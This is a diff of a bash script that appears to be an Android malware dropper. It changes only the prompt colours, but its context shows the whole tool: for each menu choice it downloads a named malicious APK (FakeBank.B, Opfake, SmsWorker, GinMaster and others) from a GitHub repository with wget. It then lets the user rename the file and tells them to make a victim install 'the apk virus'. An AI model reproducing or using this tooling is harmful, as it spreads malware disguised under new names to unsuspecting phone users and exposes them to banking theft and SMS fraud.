@@ -76,10 +76,10 @@ if [ $zCh = 1 ]; then
    echo -e "\e[0m"
    if [ $apkVirus = 1 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Agent.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Agent.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -95,10 +95,10 @@ if [ $zCh = 1 ]; then
 
    elif [ $apkVirus = 2 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/BadNews.A.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv BadNews.A.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -113,10 +113,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 3 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Bios.NativeMaliciousCode.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Bios.NativeMaliciousCode.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -131,10 +131,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 4 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Blatantsms.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Blatantsms.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -149,10 +149,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 5 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/BrainTest.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv BrainTest.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -167,10 +167,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 6 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Claco.A.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Claco.A.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -185,10 +185,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 7 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Dropdialer.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Dropdialer.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -203,10 +203,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 8 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/FakeBank.B.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeBank.B.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -221,10 +221,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 9 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/FakeCMCC.A.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeCMCC.A.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -239,10 +239,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 10 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/FakeDoc.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeDoc.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -257,10 +257,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 11 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/FakeValidation.apk
-       echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+       echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv FakeValidation.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -275,10 +275,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 12 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Fobus.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Fobus.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -293,10 +293,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 13 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/GinMaster.Z.AdvancedObfuscation.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv GinMaster.Z.AdvancedObfuscation.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -311,10 +311,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 14 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Masnu.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Masnu.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -330,10 +330,10 @@ if [ $zCh = 1 ]; then
 
    elif [ $apkVirus = 15 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Omigo.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Omigo.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -348,10 +348,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 16 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Opfake.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Opfake.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -366,10 +366,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 17 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/SmsWorker.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv SmsWorker.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -384,10 +384,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 18 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/Vietcon.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Vietcon.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -402,10 +402,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 19 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/candy_corn.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv candy_corn.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -420,10 +420,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 20 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/cat.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv cat.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -438,10 +438,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 21 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/chistescortos.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv chistrscortos.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -456,10 +456,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 22 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/chistespicanticos.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv chistespicanticos.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -474,10 +474,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 23 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.funnyys.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.funnyys.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -492,10 +492,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 24 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.imagepets.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.imagepets.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -510,10 +510,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 25 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.kitchenn.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.kitchenn.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -528,10 +528,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 26 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.laughtter.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.laughtter.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -546,10 +546,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 27 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesamor.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.prasesamor.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -564,10 +564,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 28 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesfee.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.prasesfee.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -582,10 +582,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 29 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.recipesmart.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.recipesmart.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -600,10 +600,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 30 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.romaticpos.apk
-     echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+     echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.romanticpos.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -618,10 +618,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 31 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.statetss.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.statetss.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -636,10 +636,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 32 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/com.thinkking.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv com.thinkking.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -654,10 +654,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 33 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/crd.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
